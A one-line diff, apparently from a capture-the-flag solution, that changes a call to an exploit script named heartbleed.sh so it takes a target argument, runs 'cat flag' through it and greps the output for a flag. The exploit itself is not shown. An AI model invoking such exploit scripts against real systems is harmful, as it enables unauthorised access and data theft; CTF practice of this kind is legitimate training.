@@ -1,1 +1,1 @@
-./heartbleed.sh "cat flag" | grep -o 'flag8{.*}'
+./heartbleed.sh $1 "cat flag" | grep -o 'flag8{.*}'
